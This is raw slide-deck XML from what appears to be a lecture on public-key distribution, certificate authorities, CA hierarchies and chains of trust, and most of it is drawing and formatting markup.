                    <a:pt x="595503" y="171221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="538949" y="171221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="538949" y="199313"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="595503" y="199313"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="595503" y="227609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="510578" y="227609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="510578" y="255917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="623887" y="255917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="623887" y="199313"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="652462" y="156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74" name="object 45"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId17"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7370640" y="4222800"/>
              <a:ext cx="140760" cy="142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5" name="object 46"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7040520" y="4417920"/>
              <a:ext cx="1142640" cy="46836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468360"/>
                <a:gd name="textAreaBottom" fmla="*/ 468720 h 468360"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1143000" h="468629" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="136524"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="190499" y="136524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="325435" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="476249" y="136524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1142999" y="136524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1142999" y="191822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1142999" y="274769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1142999" y="468310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="476249" y="468310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="190499" y="468310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="468310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="274769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="191822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="136524"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="19049">
              <a:solidFill>
                <a:srgbClr val="FFD3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85272860" name="object 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7119360" y="4567320"/>
            <a:ext cx="920879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FFCC00"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>public</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-32">
                <a:solidFill>
                  <a:srgbClr val="FFCC00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FFCC00"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>key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886470" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4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752C9D0A-7441-4A0D-9712-5DE638D68FF1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87360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Distribution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Public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Keys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1695050" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="5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B60EB2C-7788-4DC5-B635-9748D0088B40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349385" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="510480" y="1556640"/>
            <a:ext cx="8349120" cy="5219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8052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8052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announcement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or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directory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Risks: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forgery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tampering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80520" indent="-342360">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="714"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Lucida Sans Unicode"/>
              <a:buChar char="◆"/>
              <a:tabLst>
                <a:tab pos="380520" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Public-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="FF00FF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FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>certificate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544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Signed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statement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specifying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identity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952560">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="524"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="780480" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="008080"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>–</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="83">
                <a:solidFill>
                  <a:srgbClr val="00808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sig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1950" b="0" strike="noStrike" spc="-1" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Alice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(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“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Bob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”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, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>PK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1950" b="0" strike="noStrike" spc="-32" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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0520" indent="-342360">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="590"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Lucida Sans Unicode"/>
              <a:buChar char="◆"/>
              <a:tabLst>
                <a:tab pos="38052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Common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approach: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FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>certificate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-100">
                <a:solidFill>
                  <a:srgbClr val="FF00FF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FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>authority</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-110">
                <a:solidFill>
                  <a:srgbClr val="FF00FF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FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>(CA)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646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agency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responsible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certifying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public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keys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Browsers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are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pre-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configured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with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100+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trusted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CAs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74720" lvl="1" indent="-279360">
              <a:lnSpc>
                <a:spcPts val="2820"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="765"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="774720" algn="l"/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public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website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world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will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be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accepted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browser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if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by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these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CAs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01165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Trusted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Certificate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Authorities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25557748" name="object 3"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1143000" y="1600200"/>
            <a:ext cx="5714640" cy="4874760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1058020768" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="5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123F1DFF-070C-4509-8CFD-B197ABCCF83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18462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CA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Hierarchy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4652076" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="5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CFD2B3D-F717-4D1E-AF2C-9F876A00EF4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626690" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="510480" y="1633320"/>
            <a:ext cx="8143560" cy="4392842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808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808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Browsers,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operating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systems,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etc.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have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trusted </a:t>
            </a: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root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-75">
                <a:solidFill>
                  <a:srgbClr val="C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certificate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-72">
                <a:solidFill>
                  <a:srgbClr val="C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C00000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>authorities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Firefox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includes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over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100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trusted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root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CAs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80880" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="102000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="550"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Lucida Sans Unicode"/>
              <a:buChar char="◆"/>
              <a:tabLst>
                <a:tab pos="3808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Root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signs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intermediate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CAs,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they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sign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lower-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level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CAs,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etc.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8048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8048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C00000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chain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-26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C00000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”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952560">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="524"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="780480" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="008080"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>–</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="77">
                <a:solidFill>
                  <a:srgbClr val="00808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sig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1950" b="0" strike="noStrike" spc="-1" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Verisign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(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“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UT Austin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”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, PK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1950" b="0" strike="noStrike" spc="-1" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>UT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),</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="4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sig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1950" b="0" strike="noStrike" spc="-1" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>UT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(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“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Vitaly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-7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S.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”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, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>PK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1950" b="0" strike="noStrike" spc="-15" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Vitaly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="009192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>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0880" indent="-343080">
              <a:lnSpc>
                <a:spcPts val="3328"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="819"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Lucida Sans Unicode"/>
              <a:buChar char="◆"/>
              <a:tabLst>
                <a:tab pos="3808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responsible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verifying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identities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of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11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requestors,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-114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domain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-11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ownership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103703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Certificate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Hierarchy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118944372" name="object 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="457200" y="1523880"/>
            <a:ext cx="8283240" cy="4800240"/>
            <a:chOff x="457200" y="1523880"/>
            <a:chExt cx="8283240" cy="4800240"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="489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457200" y="1523880"/>
              <a:ext cx="8283240" cy="4800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0" name="object 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1230480" y="3276720"/>
              <a:ext cx="5665680" cy="534960"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 5665680"/>
                <a:gd name="textAreaRight" fmla="*/ 5666040 w 5665680"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 534960"/>
                <a:gd name="textAreaBottom" fmla="*/ 535320 h 534960"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="5666105" h="535304" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="5665784" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="534987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5665784" y="534987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5665784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object 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1230480" y="3276720"/>
              <a:ext cx="5665680" cy="534960"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 5665680"/>
                <a:gd name="textAreaRight" fmla="*/ 5666040 w 5665680"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 534960"/>
                <a:gd name="textAreaBottom" fmla="*/ 535320 h 534960"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="5666105" h="535304" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5665784" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5665784" y="534987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="5349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object 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="914400" y="4417920"/>
              <a:ext cx="6032160" cy="534960"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 6032160"/>
                <a:gd name="textAreaRight" fmla="*/ 6032520 w 6032160"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 534960"/>
                <a:gd name="textAreaBottom" fmla="*/ 535320 h 534960"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="6032500" h="535304" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="6032498" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="534986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6032498" y="534986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6032498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3" name="object 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="914400" y="4417920"/>
              <a:ext cx="6032160" cy="534960"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 6032160"/>
                <a:gd name="textAreaRight" fmla="*/ 6032520 w 6032160"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 534960"/>
                <a:gd name="textAreaBottom" fmla="*/ 535320 h 534960"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="6032500" h="535304" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6032498" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6032498" y="534986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="5349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4947845" name="object 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="993240" y="3218040"/>
            <a:ext cx="5811120" cy="22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3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power</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3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do</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3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they</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3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1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>have?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defRPr/>
            </a:pP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defRPr/>
            </a:pP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Who</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="36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trusts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="36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">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>their</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="36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3600" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>certificates?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59150204" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6802560" y="3555360"/>
            <a:ext cx="480960" cy="1066320"/>
            <a:chOff x="6802560" y="3555360"/>
            <a:chExt cx="480960" cy="1066320"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="496" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6848280" y="3555360"/>
              <a:ext cx="435240" cy="388800"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 435240"/>
                <a:gd name="textAreaRight" fmla="*/ 435600 w 435240"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 388800"/>
                <a:gd name="textAreaBottom" fmla="*/ 389160 h 388800"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="435609" h="389254" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="108294" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="163433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="217363" y="307463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="163216" y="389180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="435270" y="334257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="379804" y="62313"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="325657" y="144030"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="108294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object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6848280" y="3555360"/>
              <a:ext cx="435240" cy="388800"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 435240"/>
                <a:gd name="textAreaRight" fmla="*/ 435600 w 435240"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 388800"/>
                <a:gd name="textAreaBottom" fmla="*/ 389160 h 388800"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="435609" h="389254" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="163216" y="389179"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="217363" y="307462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="163433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="108294" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="325657" y="144029"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="379804" y="62313"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="435270" y="334256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="163216" y="389179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8" name="object 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6802560" y="4233960"/>
              <a:ext cx="439560" cy="38772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387720"/>
                <a:gd name="textAreaBottom" fmla="*/ 388080 h 387720"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="440054" h="387985" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="169085" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="221068" y="83110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="221385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103967" y="387604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="325036" y="249328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="377019" y="332437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="439604" y="62043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169085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object 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6802560" y="4233960"/>
              <a:ext cx="439560" cy="387720"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 439560"/>
                <a:gd name="textAreaRight" fmla="*/ 439920 w 439560"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 387720"/>
                <a:gd name="textAreaBottom" fmla="*/ 388080 h 387720"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="440054" h="387985" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="377019" y="332437"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="325035" y="249328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103967" y="387603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="221384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221068" y="83109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169085" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="439603" y="62043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="377019" y="332437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0528413" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="5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613F197-52CA-4D62-9584-AC6DEA4AC201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01023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535716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Example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88499374" name="object 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3809880" y="1600200"/>
            <a:ext cx="5181120" cy="4343040"/>
            <a:chOff x="3809880" y="1600200"/>
            <a:chExt cx="5181120" cy="4343040"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="503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3809880" y="1600200"/>
              <a:ext cx="5181120" cy="4343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04" name="object 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3809880" y="2743200"/>
              <a:ext cx="2819160" cy="771120"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2819160"/>
                <a:gd name="textAreaRight" fmla="*/ 2819520 w 2819160"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 771120"/>
                <a:gd name="textAreaBottom" fmla="*/ 771480 h 771120"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="2819400" h="771525" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="385762"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7278" y="346320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28640" y="308018"/>
                  </a:lnTo>
